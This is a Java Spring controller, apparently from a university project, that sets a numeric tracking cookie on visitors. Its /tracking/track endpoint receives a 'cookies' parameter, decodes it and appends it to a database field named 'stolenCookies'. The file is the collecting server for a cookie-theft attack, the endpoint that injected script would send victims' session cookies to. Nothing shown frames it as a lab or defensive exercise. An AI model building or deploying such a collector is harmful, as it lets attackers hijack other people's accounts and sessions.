package etu.upmc.fr.controller;

import etu.upmc.fr.entity.Tracking;
import etu.upmc.fr.repository.TrackingRepository;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.security.Principal;

/**
 * Created by daniele on 12/01/16.
 */

@Controller
public class TrackingController {
    @Autowired
    private TrackingRepository trackingRepository;

    @RequestMapping(value = "/tracking", method = RequestMethod.GET)
    public String index(@CookieValue(value = "pariServicesTracking", defaultValue = "NULL") String trackingSession, HttpServletResponse response) {

        Tracking tracking;
        Long id = 0l;
        try
        {
            id = Long.parseLong(trackingSession);
        }
        catch(NumberFormatException e)
        {
            trackingSession = "NULL";
        }

        if (trackingSession.equals("NULL"))
        {
            tracking = new Tracking();
            tracking = trackingRepository.save(tracking);
        }
        else
        {
            tracking = trackingRepository.findOne(id);
        }

        response.addCookie(new Cookie("pariServicesTracking", tracking.getId().toString()));

        return "tracking/index";
    }

    @RequestMapping(value = "/tracking/track", method = RequestMethod.GET)
    public String track(@CookieValue("pariServicesTracking") String trackingSession, String cookies) {
        Tracking tracking = trackingRepository.findOne(Long.parseLong(trackingSession));
        String stolen;
        try {
            stolen = URLDecoder.decode(cookies, "UTF-8");
        } catch (UnsupportedEncodingException e)
        {
            stolen = cookies;
        }
        tracking.setStolenCookies(tracking.getStolenCookies() + "|||" + stolen);
        trackingRepository.save(tracking);

        return "tracking/index";
    }
}
